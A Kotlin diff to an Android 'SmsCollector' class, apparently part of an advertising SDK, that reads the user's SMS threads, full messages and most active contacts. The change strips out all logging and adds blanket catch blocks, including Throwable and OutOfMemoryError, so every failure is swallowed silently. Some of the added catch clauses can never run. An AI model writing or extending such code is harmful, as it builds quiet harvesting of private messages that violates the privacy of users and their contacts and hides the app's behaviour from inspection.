@@ -8,7 +8,6 @@ import android.database.Cursor
 import android.net.Uri
 import android.os.Build
 import android.provider.Telephony
-import android.util.Log
 import androidx.core.content.ContextCompat
 import com.seamlabs.admore.core.storage.ContentResolverUtils
 import com.seamlabs.admore.data.source.local.model.SmsKeys
@@ -28,11 +27,8 @@ class SmsCollector @Inject constructor(
 ) {
 
     companion object {
-        private const val TAG = "SmsCollector"
-
         // Pre-KitKat constants for compatibility
         private val SMS_URI = Telephony.Sms.CONTENT_URI
-
         private val CONVERSATIONS_URI = Telephony.Sms.Conversations.CONTENT_URI
 
         // Column mappings for compatibility
@@ -62,9 +58,17 @@ class SmsCollector @Inject constructor(
     private val contentResolverUtils = ContentResolverUtils(context)
 
     override fun isPermissionGranted(): Boolean {
-        return ContextCompat.checkSelfPermission(
-            context, Manifest.permission.READ_SMS
-        ) == PackageManager.PERMISSION_GRANTED
+        return try {
+            ContextCompat.checkSelfPermission(
+                context, Manifest.permission.READ_SMS
+            ) == PackageManager.PERMISSION_GRANTED
+        } catch (e: Exception) {
+            false
+        } catch (e: SecurityException) {
+            false
+        } catch (e: Throwable) {
+            false
+        }
     }
 
     @SuppressLint("MissingPermission")
@@ -86,7 +90,16 @@ class SmsCollector @Inject constructor(
             collectAdditionalData(data)
 
         } catch (e: Exception) {
-            Log.e(TAG, "Error collecting SMS data: ${e.message}", e)
+            // Silently handle error
+        } catch (e: OutOfMemoryError) {
+            // Handle memory issues
+            data.clear()
+        } catch (e: SecurityException) {
+            // Handle permission issues
+        } catch (e: IllegalArgumentException) {
+            // Handle invalid arguments
+        } catch (e: Throwable) {
+            // Handle any other unexpected errors
         }
 
         return@withContext data
@@ -107,9 +120,20 @@ class SmsCollector @Inject constructor(
             )
 
             data[SmsKeys.THREADS.toKey()] = threads
-            Log.d(TAG, "Collected ${threads.size} SMS threads")
         } catch (e: Exception) {
-            Log.e(TAG, "Error collecting SMS threads: ${e.message}", e)
+            // Silently handle error
+            data[SmsKeys.THREADS.toKey()] = emptyList<Map<String, Any>>()
+        } catch (e: OutOfMemoryError) {
+            // Handle memory issues
+            data[SmsKeys.THREADS.toKey()] = emptyList<Map<String, Any>>()
+        } catch (e: SecurityException) {
+            // Handle permission issues
+            data[SmsKeys.THREADS.toKey()] = emptyList<Map<String, Any>>()
+        } catch (e: IllegalArgumentException) {
+            // Handle invalid arguments
+            data[SmsKeys.THREADS.toKey()] = emptyList<Map<String, Any>>()
+        } catch (e: Throwable) {
+            // Handle any other unexpected errors
             data[SmsKeys.THREADS.toKey()] = emptyList<Map<String, Any>>()
         }
     }
@@ -123,11 +147,26 @@ class SmsCollector @Inject constructor(
             val utilsMessages = try {
                 contentResolverUtils.safeQuerySms(
                     sortOrder = "${getColumnName(SmsKeys.MESSAGE_DATE)} DESC"
-                ).map { message ->
-                    transformMessage(message)
+                ).mapNotNull { message ->
+                    try {
+                        transformMessage(message)
+                    } catch (e: Exception) {
+                        null
+                    } catch (e: ClassCastException) {
+                        null
+                    } catch (e: Throwable) {
+                        null
+                    }
                 }
             } catch (e: Exception) {
-                Log.w(TAG, "Error using ContentResolverUtils: ${e.message}")
+                emptyList()
+            } catch (e: OutOfMemoryError) {
+                emptyList()
+            } catch (e: SecurityException) {
+                emptyList()
+            } catch (e: IllegalArgumentException) {
+                emptyList()
+            } catch (e: Throwable) {
                 emptyList()
             }
 
@@ -147,9 +186,20 @@ class SmsCollector @Inject constructor(
             }
 
             data[SmsKeys.MESSAGES.toKey()] = messages
-            Log.d(TAG, "Collected ${messages.size} SMS messages")
         } catch (e: Exception) {
-            Log.e(TAG, "Error collecting SMS messages: ${e.message}", e)
+            // Silently handle error
+            data[SmsKeys.MESSAGES.toKey()] = emptyList<Map<String, Any>>()
+        } catch (e: OutOfMemoryError) {
+            // Handle memory issues
+            data[SmsKeys.MESSAGES.toKey()] = emptyList<Map<String, Any>>()
+        } catch (e: SecurityException) {
+            // Handle permission issues
+            data[SmsKeys.MESSAGES.toKey()] = emptyList<Map<String, Any>>()
+        } catch (e: IllegalArgumentException) {
+            // Handle invalid arguments
+            data[SmsKeys.MESSAGES.toKey()] = emptyList<Map<String, Any>>()
+        } catch (e: Throwable) {
+            // Handle any other unexpected errors
             data[SmsKeys.MESSAGES.toKey()] = emptyList<Map<String, Any>>()
         }
     }
@@ -180,18 +230,34 @@ class SmsCollector @Inject constructor(
                 val activeThreads = threadsList
                     .sortedByDescending { it[SmsKeys.THREAD_MESSAGE_COUNT.toKey()] as? Int ?: 0 }
                     .take(10)
-                    .map {
-                        mapOf(
-                            "thread_id" to (it[SmsKeys.THREAD_ID.toKey()] ?: 0),
-                            "contact" to (it[SmsKeys.THREAD_CONTACT.toKey()] ?: "Unknown"),
-                            "message_count" to (it[SmsKeys.THREAD_MESSAGE_COUNT.toKey()] ?: 0)
-                        )
+                    .mapNotNull {
+                        try {
+                            mapOf(
+                                "thread_id" to (it[SmsKeys.THREAD_ID.toKey()] ?: 0),
+                                "contact" to (it[SmsKeys.THREAD_CONTACT.toKey()] ?: "Unknown"),
+                                "message_count" to (it[SmsKeys.THREAD_MESSAGE_COUNT.toKey()] ?: 0)
+                            )
+                        } catch (e: Exception) {
+                            null
+                        } catch (e: ClassCastException) {
+                            null
+                        } catch (e: Throwable) {
+                            null
+                        }
                     }
 
                 data["most_active_threads"] = activeThreads
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error collecting additional SMS data: ${e.message}", e)
+            // Silently handle error
+        } catch (e: OutOfMemoryError) {
+            // Handle memory issues
+        } catch (e: SecurityException) {
+            // Handle permission issues
+        } catch (e: IllegalArgumentException) {
+            // Handle invalid arguments
+        } catch (e: Throwable) {
+            // Handle any other unexpected errors
         }
     }
 
@@ -232,12 +298,25 @@ class SmsCollector @Inject constructor(
                     try {
                         results.add(mapper(cursor))
                     } catch (e: Exception) {
-                        Log.w(TAG, "Error mapping cursor data: ${e.message}")
+                        // Silently handle error
+                    } catch (e: ClassCastException) {
+                        // Silently handle error
+                    } catch (e: Throwable) {
+                        // Silently handle error
                     }
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error querying content resolver: ${e.message}", e)
+            // Silently handle error
+        } catch (e: OutOfMemoryError) {
+            // Handle memory issues
+            results.clear()
+        } catch (e: SecurityException) {
+            // Handle permission issues
+        } catch (e: IllegalArgumentException) {
+            // Handle invalid arguments
+        } catch (e: Throwable) {
+            // Handle any other unexpected errors
         }
 
         return results
@@ -276,7 +355,11 @@ class SmsCollector @Inject constructor(
                 0L
             )
         } catch (e: Exception) {
-            Log.w(TAG, "Error mapping thread data: ${e.message}")
+            // Silently handle error
+        } catch (e: ClassCastException) {
+            // Silently handle error
+        } catch (e: Throwable) {
+            // Silently handle error
         }
 
         return threadMap
@@ -345,7 +428,11 @@ class SmsCollector @Inject constructor(
                 0L
             )
         } catch (e: Exception) {
-            Log.w(TAG, "Error mapping message data: ${e.message}")
+            // Silently handle error
+        } catch (e: ClassCastException) {
+            // Silently handle error
+        } catch (e: Throwable) {
+            // Silently handle error
         }
 
         return messageMap
@@ -355,7 +442,13 @@ class SmsCollector @Inject constructor(
      * Get the actual column name for the given SmsKey based on device API level
      */
     private fun getColumnName(key: SmsKeys): String {
-        return COLUMN_MAPPINGS[key] ?: key.name.lowercase()
+        return try {
+            COLUMN_MAPPINGS[key] ?: key.name.lowercase()
+        } catch (e: Exception) {
+            key.name.lowercase()
+        } catch (e: Throwable) {
+            key.name.lowercase()
+        }
     }
 
     // Utility methods for safely accessing cursor data
@@ -373,6 +466,10 @@ class SmsCollector @Inject constructor(
             if (columnIndex != -1) cursor.getString(columnIndex) ?: defaultValue else defaultValue
         } catch (e: Exception) {
             defaultValue
+        } catch (e: ClassCastException) {
+            defaultValue
+        } catch (e: Throwable) {
+            defaultValue
         }
     }
 
@@ -384,6 +481,10 @@ class SmsCollector @Inject constructor(
             val columnIndex = cursor.getColumnIndex(columnName)
             if (columnIndex != -1) cursor.getInt(columnIndex) else defaultValue
         } catch (e: Exception) {
+            defaultValue
+        } catch (e: ClassCastException) {
+            defaultValue
+        } catch (e: Throwable) {
             defaultValue
         }
     }
@@ -397,7 +498,10 @@ class SmsCollector @Inject constructor(
             if (columnIndex != -1) cursor.getLong(columnIndex) else defaultValue
         } catch (e: Exception) {
             defaultValue
+        } catch (e: ClassCastException) {
+            defaultValue
+        } catch (e: Throwable) {
+            defaultValue
         }
-
     }
 }
